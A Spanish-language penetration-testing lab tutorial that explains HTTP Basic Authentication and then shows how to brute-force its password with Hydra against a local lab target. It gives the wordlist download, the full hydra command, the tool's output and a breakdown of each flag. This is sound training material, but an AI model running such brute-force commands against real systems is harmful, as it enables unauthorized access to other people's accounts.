
# Autenticación HTTP básica

Las aplicaciones web suelen emplear mecanismos de autenticación para proteger datos y funcionalidades confidenciales. La autenticación HTTP básica, o `Basic Auth`, es un método rudimentario pero común para proteger recursos en la web. Si bien es fácil de implementar, sus vulnerabilidades de seguridad inherentes la convierten en un blanco frecuente de ataques de fuerza bruta.

En esencia, la autenticación básica es un protocolo de challenge-response donde un servidor web solicita las credenciales del usuario antes de otorgar acceso a recursos protegidos. El proceso comienza cuando un usuario intenta acceder a un área restringida. El servidor responde con un estado `401 Unauthorized` y un encabezado `WWW-Authenticate` que solicita al navegador del usuario que muestre un cuadro de diálogo de inicio de sesión.

Una vez que el usuario proporciona su nombre de usuario y contraseña, el navegador los concatena en una sola cadena, separados por dos puntos. Esta cadena se codifica en Base64 y se incluye en el encabezado `Authorization` de las solicitudes posteriores, con el formato `Basic <encoded_credentials>`. El servidor decodifica las credenciales, las verifica con su base de datos y concede o deniega el acceso según corresponda.

Por ejemplo, los encabezados de autenticación básica en una solicitud HTTP GET se verían así:

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## <mark style="color:purple;">Explotación de Basic Auth con Hydra</mark>

Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.

Utilizaremos el servicio `http-get` con Hydra para forzar el objetivo de autenticación básica.

En este escenario, la instancia de destino generada utiliza autenticación HTTP básica. Ya sabemos que el nombre de usuario es `basic-auth-user`. Como ya lo conocemos, podemos simplificar el comando Hydra y centrarnos únicamente en la fuerza bruta de la contraseña. Este es el comando que usaremos:

```bash
# Descargar wordlist si se necesita
afsh4ck@kali$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Comando de Hydra
afsh4ck@kali$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

Analicemos el comando:

* `-l basic-auth-user`: Esto especifica que el nombre de usuario para el intento de inicio de sesión es 'basic-auth-user'.
* `-P 2023-200_most_used_passwords.txt`: Esto indica que Hydra debería usar la lista de contraseñas contenida en el archivo '2023-200\_most\_used\_passwords.txt' para su ataque de fuerza bruta.
* `127.0.0.1`: Esta es la dirección IP de destino, en este caso, la máquina local (localhost).
* `http-get /`:Esto le dice a Hydra que el servicio de destino es un servidor HTTP y que el ataque debe realizarse mediante solicitudes HTTP GET a la ruta raíz ('/').
* `-s 81`: Esto anula el puerto predeterminado para el servicio HTTP y lo establece en 81.

Tras la ejecución, Hydra intentará introducir sistemáticamente cada contraseña del archivo `2023-200_most_used_passwords.txt` en el recurso especificado. Finalmente, devolverá la contraseña correcta para \[nombre `basic-auth-user`del recurso], que puede usar para iniciar sesión en el sitio web y recuperar la flag.
